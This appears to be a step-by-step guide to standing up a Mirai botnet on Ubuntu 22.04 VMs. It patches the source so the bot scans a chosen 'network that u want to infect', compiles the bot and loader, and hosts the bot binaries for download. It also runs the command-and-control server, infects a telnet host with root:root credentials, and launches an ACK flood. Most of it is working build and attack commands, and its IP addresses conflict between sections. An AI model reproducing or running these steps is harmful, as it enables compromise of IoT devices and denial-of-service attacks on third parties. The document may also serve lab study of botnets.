## Complete Ubuntu 22.04 Setup 

### Step 1: modification

1. **mirai.patch :**
+    addr.sin_addr.s_addr = INET_ADDR(192,168,1,55);   // IP of the dns
+    return INET_ADDR(192,168,o3,o4); // the network that u want to infect

2. **mirai/loader/src/main.c :**

- snprintf(strbuf, sizeof(strbuf), "192.168.1.%d:23 root:root", i); // the network that u want to infect
- snprintf(strbuf, sizeof(strbuf), "192.168.%d.%d:23 root:root", o3, o4); // the network that u want to infect
- addrs[0] = inet_addr("192.168.1.57"); // IP of the loader
- if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs,1024 * 64, "192.168.1.57", 80, "192.168.1.57")) == NULL) // IP of the loader

3. **router setup:**
- echo "address=/cnc.local/192.168.1.56" | sudo tee -a /etc/dnsmasq.conf // IP of the cnc

---

## ROUTER VM (Ubuntu 22.04) - Complete Setup

```bash
sudo apt update && sudo apt upgrade -y

# Install packages
sudo apt install -y iptables-persistent dnsmasq busybox-static make gcc


# Set hostname
echo router | sudo tee /etc/hostname
sudo hostnamectl set-hostname router
sudo sed -i 's/127.0.1.1.*/127.0.1.1       router/' /etc/hosts

# Configure DNS
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved
echo "address=/cnc.local/172.16.237.235" | sudo tee -a /etc/dnsmasq.conf
sudo systemctl enable dnsmasq
sudo systemctl start dnsmasq

# Set root password
echo "root:root" | sudo chpasswd

# Configure telnet
for i in {0..9}; do
    echo "pts/$i" | sudo tee -a /etc/securetty
done

# Create telnet service
sudo tee /etc/systemd/system/telnetd.service << 'EOF'
[Unit]
Description=Telnetd service
After=network.target

[Service]
ExecStart=/usr/bin/busybox telnetd -F
Restart=always
RestartSec=1
StandardOutput=syslog
StandardError=syslog
SyslogIdentifier=telnetd

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable telnetd.service
sudo systemctl start telnetd.service
# On Router VM after installation
sudo ln -s /usr/bin/busybox /bin/busybox
```

---

## CNC VM (Ubuntu 22.04) - Complete Setup with Patch

```bash
#!/bin/bash
# CNC VM - Ubuntu 22.04 with your patch

sudo apt update && sudo apt upgrade -y

sudo apt install -y screen

# Set hostname
echo cnc | sudo tee /etc/hostname
sudo hostnamectl set-hostname cnc
sudo sed -i 's/127.0.1.1.*/127.0.1.1       cnc/' /etc/hosts

# Install dependencies
sudo apt install -y git mysql-server mysql-client build-essential wget

# Download 64-bit Go
cd /tmp
wget https://dl.google.com/go/go1.15.15.linux-amd64.tar.gz

# Extract to /usr/local
sudo tar -C /usr/local -xzf go1.15.15.linux-amd64.tar.gz

# Clean up
rm go1.15.15.linux-amd64.tar.gz

# Verify
ls -la /usr/local/go/bin/go
/usr/local/go/bin/go version

# Add to PATH
export PATH=/usr/local/go/bin:$PATH

# Test
go version

# Create Go workspace
mkdir -p ~/go/src ~/go/bin ~/go/pkg

# Configure MySQL (Ubuntu 22.04 compatibility)
sudo systemctl start mysql
sudo systemctl enable mysql

sudo mysql << 'EOF'
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'root';
CREATE USER IF NOT EXISTS 'mirai'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'mirai'@'localhost';
FLUSH PRIVILEGES;
EOF

# Install Go dependencies
mkdir -p ~/go/src/github.com/go-sql-driver
cd ~/go/src/github.com/go-sql-driver
git clone https://github.com/go-sql-driver/mysql.git
cd mysql
git checkout v1.5.0

mkdir -p ~/go/src/github.com/mattn
cd ~/go/src/github.com/mattn
git clone https://github.com/mattn/go-shellwords.git
cd go-shellwords
git checkout v1.0.12

# Clone and patch Mirai
cd ~
git clone https://github.com/hameza123/Mirai-Source-Code.git
cd Mirai-Source-Code

# Apply your patch
git apply  mirai.patch 

# Fix ioutil deprecation for Ubuntu 22.04
cd mirai/cnc
sed -i 's/"io\/ioutil"/"os"/' admin.go
sed -i 's/ioutil.ReadFile/os.ReadFile/' admin.go


# Import database
sudo mysql
mysql -u root -proot -e "SELECT 1"

# Save your schema to a file
cat > ~/mirai_complete_schema.sql << 'EOF'
-- Create database
CREATE DATABASE IF NOT EXISTS mirai;
USE mirai;

-- Users table
CREATE TABLE IF NOT EXISTS `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);

-- History table
CREATE TABLE IF NOT EXISTS `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);

-- Whitelist table (protected IPs)
CREATE TABLE IF NOT EXISTS `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);

 
INSERT INTO `users` (`username`, `password`, `admin`, `max_bots`, `duration_limit`, `cooldown`, `last_paid`, `wrc`, `intvl`)
VALUES ('mirai', 'password', 1, -1, 3600, 0, UNIX_TIMESTAMP(), 0, 30);


-- Insert whitelist for your lab network


-- Create database user (MySQL 8.0 compatible)
CREATE USER IF NOT EXISTS 'mirai'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON mirai.* TO 'mirai'@'localhost';
FLUSH PRIVILEGES;

-- Show results
SELECT '=== Database Setup Complete ===' AS '';
SELECT '=== Users ===' AS '';
SELECT id, username, admin, max_bots FROM users;

SELECT '=== Whitelist ===' AS '';
SELECT * FROM whitelist;
EOF

# Import the schema
mysql -u root -proot < ~/mirai_complete_schema.sql 2>/dev/null || sudo mysql < ~/mirai_complete_schema.sql

# Test the connection
mysql -u mirai -ppassword -e "USE mirai; SELECT * from users;"

cd ~/Mirai-Source-Code/mirai/cnc

# Change database credentials to root
sed -i 's/const DatabaseUser string   = "mirai"/const DatabaseUser string   = "root"/' main.go
sed -i 's/const DatabasePass string   = "password"/const DatabasePass string   = "root"/' main.go

# Verify the change
grep "DatabaseUser\|DatabasePass" main.go

# After the script runs, verify MySQL
sudo systemctl status mysql

# Test connections
mysql -u root -proot -e "SELECT 'MySQL OK'"
mysql -u mirai -ppassword -e "USE mirai; SHOW TABLES'"

# Build CNC
cd ~/Mirai-Source-Code
mkdir -p ~/mirai
export GO111MODULE=off
export CGO_ENABLED=0

go build -o ~/mirai/cnc mirai/cnc/*.go
go build -o ~/mirai/report mirai/tools/scanListen.go
echo "CNC VM configured!"
```

---

## LOADER VM (Ubuntu 22.04) 

```bash
sudo apt update && sudo apt upgrade -y

# Install dependencies
sudo apt install -y git gcc make apache2 build-essential electric-fence

# Set hostname
echo loader | sudo tee /etc/hostname
sudo hostnamectl set-hostname loader
sudo sed -i 's/127.0.1.1.*/127.0.1.1       loader/' /etc/hosts

# Clone and patch Mirai
cd ~
git clone https://github.com/hameza123/Mirai-Source-Code.git
cd Mirai-Source-Code

# Apply your patch
git apply  mirai.patch 


# Create output directory
mkdir -p ~/mirai

cd ~/Mirai-Source-Code/mirai/bot

# Add LOCAL_ADDR back with proper declaration
echo "" >> includes.h
echo "// Global variables" >> includes.h
echo "extern uint32_t LOCAL_ADDR;" >> includes.h
tail -5 includes.h
sed -i '/#include "includes.h"/a uint32_t LOCAL_ADDR;' main.c
sed -i '/#include "includes.h"/a uint32_t LOCAL_ADDR;' scanner.c
sed -i '/#include "includes.h"/a uint32_t LOCAL_ADDR;' attack_gre.c
sed -i '/#include "includes.h"/a uint32_t LOCAL_ADDR;' attack_tcp.c
sed -i '/#include "includes.h"/a uint32_t LOCAL_ADDR;' attack_udp.c

# Install musl toolchain
sudo apt install -f musl-tools -y
# Install kernel headers
sudo apt install -y linux-headers-$(uname -r) linux-libc-dev
# For musl, we need to point to the right includes
sudo apt install -y musl-dev
# Create symlinks for kernel headers in musl include path
sudo ln -sf /usr/include/linux /usr/lib/x86_64-linux-musl/include/ 2>/dev/null || true
sudo ln -sf /usr/include/asm-generic /usr/lib/x86_64-linux-musl/include/ 2>/dev/null || true

# Fix the includes
cd ~/Mirai-Source-Code/mirai/bot/
sed -i 's/#include <linux\/ip.h>/#include <netinet\/ip.h>/' attack.h
sed -i 's/#include <linux\/ip.h>/#include <netinet\/ip.h>/' attack_gre.c
sed -i 's/#include <linux\/ip.h>/#include <netinet\/ip.h>/' attack_tcp.c
sed -i 's/#include <linux\/ip.h>/#include <netinet\/ip.h>/' attack_udp.c
sed -i 's/#include <linux\/ip.h>/#include <netinet\/ip.h>/' checksum.c
sed -i 's/#include <linux\/ip.h>/#include <netinet\/ip.h>/' scanner.c
sed -i 's/#include <linux\/limits.h>/#include <limits.h>/' killer.c
sed -i '/#include <netinet\/ip.h>/a #include <netinet\/tcp.h>\n#include <netinet\/udp.h>' attack_tcp.c 2>/dev/null || true
find . -type f -exec sed -i 's/#include <linux\/ip.h>/#include <netinet\/ip.h>/g' {} \;
find . -type f -exec sed -i 's/#include <linux\/tcp.h>/#include <netinet\/tcp.h>/g' {} \;
find . -type f -exec sed -i 's/#include <linux\/udp.h>/#include <netinet\/udp.h>/g' {} \;
find . -type f -exec sed -i 's/#include <linux\/icmp.h>/#include <netinet\/ip_icmp.h>/g' {} \;
find . -type f -exec sed -i 's/#include <linux\/if_ether.h>/#include <netinet\/if_ether.h>/g' {} \;
find . -type f -exec sed -i 's/#include <linux\/limits.h>/#include <limits.h>/g' {} \;
find . -type f -exec sed -i 's/#include <linux\/socket.h>/#include <sys\/socket.h>/g' {} \;
sed -i 's/#include <linux\/ip.h>/#include <netinet\/ip.h>/' checksum.h

# Recompile bot with musl (fully static, no glibc deps)
cd ~/Mirai-Source-Code/mirai/
musl-gcc -std=c99 bot/*.c \
    -DMIRAI_TELNET \
    -static \
    -Os \
    -fcommon \
    -D_FORTIFY_SOURCE=0 \
    -o ~/mirai/mirai.x86.musl

# Strip to reduce size
strip ~/mirai/mirai.x86.musl

# Setup web server
sudo mkdir -p /var/www/html/bins
# Copy to web server
sudo cp ~/mirai/mirai.x86.musl /var/www/html/bins/mirai.x86
sudo cp ~/mirai/mirai.x86.musl /var/www/html/bins/mirai.x86_64
sudo chmod 755 /var/www/html/bins/*

# Build loader (with your patch applied)
sudo ln -s /usr/lib/x86_64-linux-gnu/libefence.so /usr/lib/libefence.so 2>/dev/null || true

# Fix common compilation errors
sed -i 's/#include <sys\/socket.h>/#include <sys\/socket.h>\n#include <sys\/select.h>/' loader.c

# Fix any implicit function declarations
sed -i 's/bzero(/memset(/' telnetInfo.c

cd ~/Mirai-Source-Code/loader/

cd ~/Mirai-Source-Code/loader/src

# Corriger le return sans valeur
sed -i 's/return;/return FALSE;/' binary.c

# Ajouter les headers nécessaires
sed -i '1i#include <arpa/inet.h>\n#include <unistd.h>' connection.c

# Remplacer l'appel incorrect
sed -i 's/uint32_t_to_ip/uint32_to_ip/' main.c
# Ajouter les headers
sed -i '1i#include <ctype.h>\n#include <stdlib.h>\n#include <unistd.h>' util.c

# Try building with debugging (as in your original setup)
gcc -lefence -g -DDEBUG -static -lpthread -pthread -O3 src/*.c -o ~/mirai/loader.dbg

# If that fails, try without static linking
gcc -lefence -g -DDEBUG -lpthread -pthread -O3 src/*.c -o ~/mirai/loader.dbg

# Or with -fcommon (GCC 10+ fix)
gcc -lefence -g -DDEBUG -static -lpthread -pthread -O3 -fcommon src/*.c -o ~/mirai/loader.dbg


# Create bins directory for droppers
mkdir -p ~/mirai/bins
cp ~/Mirai-Source-Code/loader/bins/* ~/mirai/bins/ 2>/dev/null || echo "No droppers yet"

# Start Apache
sudo systemctl enable apache2
sudo systemctl start apache2
echo "Loader VM configured!"
```

---

## VICTIM VM (Ubuntu 22.04) - Complete Setup

```bash
#!/bin/bash
# Victim VM - Ubuntu 22.04

sudo apt update && sudo apt upgrade -y

# Set hostname
echo victim | sudo tee /etc/hostname
sudo hostnamectl set-hostname victim
sudo sed -i 's/127.0.1.1.*/127.0.1.1       victim/' /etc/hosts

sudo netplan apply

# Install monitoring tools
sudo apt install -y tcpdump

echo "Victim VM configured!"
```

---

## Key Changes Your Patch Makes

### 1. **Loader Changes**
- Binds to `192.168.1.13` (your Loader IP)
- Uses `192.168.1.13` for wget/tftp server
- Adds grep for `/dev/` in mounts check

### 2. **Bot Changes**
- Enables scanner (commented out DEBUG)
- DNS server points to `192.168.1.11` (Router)
- Scans only `192.168.x.x` network (modified `get_random_ip`)
- CNC domain: `cnc.local` (not changeme.com)

### 3. **CNC Changes**
- Database user: `mirai` (not root)
- English prompts (not Russian)
- Uses `tcp4` for listening

### 4. **Database Changes**
- Drops and recreates database
- Creates `mirai` user
- Inserts default `mirai/password` admin

---

## Quick Start Commands After Setup

### Router VM:
```bash
sudo systemctl status dnsmasq telnetd
```

### CNC VM:
```bash
cd ~/mirai
screen -S cnc
sudo ./cnc
# Ctrl+A, D to detach

screen -S report
./report
# Ctrl+A, D to detach
```

### Loader VM:
```bash
cd ~/mirai
sudo ./loader.dbg
# Enter: 192.168.1.11:23 root:root
```

### Victim VM:
```bash
# Monitor traffic
sudo tcpdump -i ens33 -n
```

### Launch Attack:
```bash
# From any VM
telnet 192.168.1.12 23
# Login: mirai / password
ack 192.168.1.14 10
```

---

## Verification Commands

### Check All VMs are Reachable:
```bash
# From any VM
ping -c 2 192.168.1.11
ping -c 2 192.168.1.12
ping -c 2 192.168.1.13
ping -c 2 192.168.1.14
```

### Check DNS Resolution:
```bash
nslookup cnc.local 192.168.1.11
# Should return: 192.168.1.12
```

### Check CNC is Running:
```bash
# On CNC VM
sudo netstat -tlnp | grep -E "23|48101"
# Should show:
# tcp 0 0 0.0.0.0:23 0.0.0.0:* LISTEN
# tcp 0 0 0.0.0.0:48101 0.0.0.0:* LISTEN
```

This setup should work perfectly on Ubuntu 22.04 with all your patch modifications!